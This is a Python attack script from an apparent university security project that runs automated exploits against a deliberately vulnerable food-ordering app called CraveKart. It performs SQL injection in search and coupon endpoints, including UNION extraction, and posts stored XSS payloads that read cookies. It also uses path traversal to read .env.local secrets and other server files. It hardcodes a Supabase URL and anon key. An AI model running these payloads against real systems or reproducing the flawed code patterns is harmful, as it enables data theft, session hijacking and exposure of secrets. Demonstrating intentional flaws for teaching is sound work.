#!/usr/bin/env python3
"""
A03: Injection -- Automated Attack Demo
=======================================
CraveKart University Security Project

Demonstrates 4 injection vulnerability vectors:
  1. SQL Injection in Search      -- search_items RPC string concatenation
  2. SQL Injection in Coupon      -- redeem_coupon RPC string concatenation
  3. Stored XSS in Reviews        -- dangerouslySetInnerHTML renders raw HTML
  4. Path Traversal in Receipts   -- ../../ reads arbitrary server files

Usage:
    py scripts/a03_injection.py [BASE_URL]

    BASE_URL defaults to http://localhost:3000
"""

import sys
import json
import requests

# -- Config ------------------------------------------------------------------

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
SUPABASE_URL = "https://xcjgpffjfeoydsevivrr.supabase.co"
ANON_KEY = "sb_publishable_9SKE0PoVf78Ew2DP32AvLw_3xOqi4aD"

# -- Helpers -----------------------------------------------------------------

RESET  = "\033[0m"
BOLD   = "\033[1m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
DIM    = "\033[2m"

session = requests.Session()


def banner(num, title):
    print()
    print("=" * 70)
    print("  ATTACK {}: {}".format(num, title))
    print("=" * 70)
    print()


def vuln(msg):
    print("  {}[VULN] {}{}".format(BOLD + RED, msg, RESET))


def info(msg):
    print("  {}{}{}".format(DIM, msg, RESET))


def ok(msg):
    print("  {}{}{}".format(GREEN, msg, RESET))


def warn(msg):
    print("  {}{}{}".format(YELLOW, msg, RESET))


# -- Attack 1: SQL Injection in Search --------------------------------------

def attack_sqli_search():
    banner(1, "SQL Injection in search_items RPC")
    info("The search_items Postgres function builds SQL via string concatenation:")
    info("  execute 'select * from menu_items where name ilike ''%' || query || '%'''")
    info("No escaping, no parameterization. Injecting breaks out of the LIKE clause.")
    print()

    # First, do a normal search to show baseline
    info("--- Baseline: normal search for 'pizza' ---")
    print()
    print("  {}GET{} /api/search?q=pizza".format(BOLD, RESET))
    r = session.get("{}/api/search?q=pizza".format(BASE))
    data = r.json()
    items = data.get("items", [])
    ok("  Found {} item(s)".format(len(items)))
    for it in items:
        info("    - {} (Rs.{})".format(it.get("name", "?"), it.get("price", 0)))
    print()

    # Now inject SQLi payload
    payload = "x' or 1=1--"
    info("--- INJECTED: searching for '{}' ---".format(payload))
    info("This closes the LIKE string, adds OR 1=1, and comments out the rest.")
    print()
    print("  {}GET{} /api/search?q={}".format(BOLD, RESET, requests.utils.quote(payload)))
    r = session.get("{}/api/search?q={}".format(BASE, requests.utils.quote(payload)))
    data = r.json()
    items = data.get("items", [])

    ok("  Found {} item(s)".format(len(items)))
    for it in items:
        info("    - {} (Rs.{})".format(it.get("name", "?"), it.get("price", 0)))

    print()
    if len(items) > 2:
        vuln("SQLi returned ALL {} menu items -- the WHERE clause was bypassed!".format(len(items)))
    else:
        warn("  Payload may not have injected (check server logs).")
    print()

    # Show what the injected SQL looks like
    info("  Injected SQL becomes:")
    info("    select * from public.menu_items where name ilike '%' or 1=1--%'")
    info("  The -- comments out the trailing %', making the condition always true.")
    print()


# -- Attack 2: SQL Injection in Coupon --------------------------------------

def attack_sqli_coupon():
    banner(2, "SQL Injection in redeem_coupon RPC")
    info("The redeem_coupon Postgres function also uses string concatenation:")
    info("  execute 'select discount from coupons where code = ''' || code || ''''")
    info("Injecting breaks out of the WHERE clause and returns any coupon's discount.")
    print()

    # Normal coupon lookup
    info("--- Baseline: valid coupon 'FRESH10' ---")
    print()
    print("  {}GET{} /api/coupon?code=FRESH10".format(BOLD, RESET))
    r = session.get("{}/api/coupon?code=FRESH10".format(BASE))
    data = r.json()
    ok("  Discount: Rs.{}%".format(data.get("discount", 0)))
    print()

    # SQLi payload
    payload = "x' OR '1'='1"
    info("--- INJECTED: coupon code '{}' ---".format(payload))
    info("This closes the code string and makes the WHERE clause always true.")
    print()
    print("  {}GET{} /api/coupon?code={}".format(BOLD, RESET, requests.utils.quote(payload)))
    r = session.get("{}/api/coupon?code={}".format(BASE, requests.utils.quote(payload)))
    data = r.json()
    discount = data.get("discount", 0)

    ok("  Returned discount: Rs.{}%".format(discount))
    print()
    if discount > 0:
        vuln("SQLi returned discount {}% -- the first coupon row was returned!".format(discount))
    else:
        warn("  Injection may not have returned a value (check if coupons table has data).")
    print()

    info("  Injected SQL becomes:")
    info("    select discount from public.coupons where code = '' OR '1'='1'")
    info("  The condition '1'='1' is always true, returning the first coupon's discount.")
    print()

    # Advanced: try to extract data with UNION
    info("--- Advanced: UNION-based extraction ---")
    info("Attempting to extract coupon codes and discounts via UNION SELECT:")
    payload2 = "' UNION SELECT code||': '||discount FROM coupons--"
    print()
    print("  {}GET{} /api/coupon?code={}".format(BOLD, RESET, requests.utils.quote(payload2)))
    r2 = session.get("{}/api/coupon?code={}".format(BASE, requests.utils.quote(payload2)))
    data2 = r2.json()
    result = data2.get("discount", 0) or data2.get("code", "")
    info("  Raw result: {}".format(result))
    if result:
        vuln("UNION injection extracted data from the coupons table!")
    print()


# -- Attack 3: Stored XSS in Reviews ----------------------------------------

def attack_stored_xss():
    banner(3, "Stored XSS via dangerouslySetInnerHTML in Reviews")
    info("Reviews are stored with no sanitization and rendered via")
    info("dangerouslySetInnerHTML={{ __html: r.content }} on the product page.")
    info("Any HTML/JS injected executes for EVERY visitor who views the product.")
    print()

    # Post a review with various XSS payloads
    payloads = [
        {
            "label": "Image onerror (basic XSS)",
            "payload": '<img src=x onerror="alert(document.cookie)">',
            "desc": "Broken image triggers onerror -> executes JS",
        },
        {
            "label": "SVG onload (alternative vector)",
            "payload": '<svg onload="alert(document.domain)">',
            "desc": "SVG element fires onload -> executes JS",
        },
    ]

    product_id = "00000000-0000-4000-a000-000000000001"

    for i, p in enumerate(payloads):
        info("--- Payload {}: {} ---".format(i + 1, p["label"]))
        info("{}".format(p["desc"]))
        print()
        print("  {}POST{} /api/reviews".format(BOLD, RESET))
        info("  product_id: {}".format(product_id))
        info("  content:    {}".format(p["payload"]))
        print()

        r = session.post("{}/api/reviews".format(BASE), json={
            "product_id": product_id,
            "author": "XSS Attacker",
            "content": p["payload"],
            "rating": 1,
        })
        data = r.json()

        if r.status_code in (200, 201):
            review = data.get("review", {})
            ok("  Review stored! ID: {}".format(review.get("id", "?")))
            vuln("HTML stored verbatim -- will execute when product page is loaded.")
        else:
            warn("  HTTP {}: {}".format(r.status_code, data.get("error", "?")))
        print()

    # Verify the reviews are stored via direct Supabase read
    info("--- Verifying stored XSS payloads in database ---")
    headers_anon = {
        "apikey": ANON_KEY,
        "Authorization": "Bearer {}".format(ANON_KEY),
    }
    r = session.get(
        "{}/rest/v1/reviews?select=id,author,content,product_id&product_id=eq.{}&order=id.desc&limit=5".format(
            SUPABASE_URL, product_id
        ),
        headers=headers_anon,
    )
    reviews = r.json()
    print()
    for rev in reviews:
        content = rev.get("content", "")
        if "<" in content:
            print("  ID {}  author={:<15s} content={}".format(
                str(rev.get("id", "?"))[:8],
                str(rev.get("author", "?"))[:15],
                content[:60]
            ))
    print()
    vuln("XSS payloads stored in DB. Visit /product/{} to trigger them.".format(product_id))
    info("The product page renders reviews via:")
    info('  <div dangerouslySetInnerHTML={{ __html: r.content }} />')
    info("No sanitization, no escaping, no CSP headers.")
    print()


# -- Attack 4: Path Traversal in Receipts ------------------------------------

def attack_path_traversal():
    banner(4, "Path Traversal via /api/receipt")
    info("The receipt endpoint reads files using:")
    info("  path.join(RECEIPT_STORAGE_DIR, filename)")
    info("No normalization or allowlist. ../ traverses up the directory tree.")
    print()

    payloads = [
        {
            "label": "Read .env.local (secrets file)",
            "path": "../../.env.local",
            "desc": "Contains Supabase URL, API keys, DB password",
        },
        {
            "label": "Read package.json",
            "path": "../../package.json",
            "desc": "Application dependencies and scripts",
        },
        {
            "label": "Read Next.js config",
            "path": "../../next.config.mjs",
            "desc": "Server configuration",
        },
    ]

    for p in payloads:
        info("--- {} ---".format(p["label"]))
        info("{}".format(p["desc"]))
        print()
        print("  {}GET{} /api/receipt?filename={}".format(BOLD, RESET, requests.utils.quote(p["path"])))
        print()

        r = session.get("{}/api/receipt?filename={}".format(BASE, requests.utils.quote(p["path"])))
        data = r.json()

        if r.status_code == 200:
            content = data.get("content", "")
            ok("  HTTP {} -- file read successfully!".format(r.status_code))
            print()
            # Show first 10 lines of content
            lines = content.split("\n")[:10]
            for line in lines:
                info("    {}".format(line))
            if len(content.split("\n")) > 10:
                info("    ... ({} more lines)".format(len(content.split("\n")) - 10))
            print()
            vuln("Server file read via path traversal!")
        else:
            warn("  HTTP {}: {}".format(r.status_code, data.get("error", "?")))
        print()

    # Show the vulnerable code path
    info("  Vulnerable code (app/api/receipt/route.ts):")
    info("    const dir = process.env.RECEIPT_STORAGE_DIR ?? './public/receipts'")
    info("    const full = path.join(dir, filename)  // <-- no normalization")
    info("    const content = await readFile(full, 'utf8')")
    print()
    info("  path.join('public/receipts', '../../.env.local') = '.env.local'")
    info("  The .. escapes the receipts directory and reads project root files.")
    print()

    # Extra: try to read other interesting files
    info("--- Bonus: scanning for sensitive files ---")
    bonus_paths = [
        ("../../supabase/setup.sql", "Database schema + seed data"),
        ("../../AGENTS.md", "Project agent configuration"),
    ]
    for bp, desc in bonus_paths:
        r = session.get("{}/api/receipt?filename={}".format(BASE, requests.utils.quote(bp)))
        if r.status_code == 200:
            ok("  READABLE: {} ({})".format(bp, desc))
    print()


# -- Main --------------------------------------------------------------------

def main():
    print()
    print("#" * 70)
    print("  A03: Injection -- Automated Attack Script")
    print("  Target: {}".format(BASE))
    print("  Supabase: {}".format(SUPABASE_URL))
    print("#" * 70)

    attacks = [
        attack_sqli_search,
        attack_sqli_coupon,
        attack_stored_xss,
        attack_path_traversal,
    ]

    for attack in attacks:
        try:
            attack()
        except requests.ConnectionError:
            print()
            print("  [ERROR] Could not connect to {}".format(BASE))
            print("  Make sure the dev server is running: npm run dev --webpack")
            print()
            sys.exit(1)
        except Exception as e:
            print()
            print("  [ERROR] {}".format(e))
            print()

    print("=" * 70)
    print("  ALL 4 ATTACKS COMPLETED")
    print("=" * 70)
    print()
    print("  Summary of A03 Injection vulnerabilities in CraveKart:")
    print()
    print("  1. SQLi in search_items  -- string concat in EXECUTE, returns all rows")
    print("  2. SQLi in redeem_coupon -- string concat in EXECUTE, returns any discount")
    print("  3. Stored XSS in reviews -- dangerouslySetInnerHTML renders raw HTML/JS")
    print("  4. Path Traversal        -- ../ in filename reads arbitrary server files")
    print()
    print("  These are INTENTIONAL vulnerabilities for your university demo.")
    print()


if __name__ == "__main__":
    main()
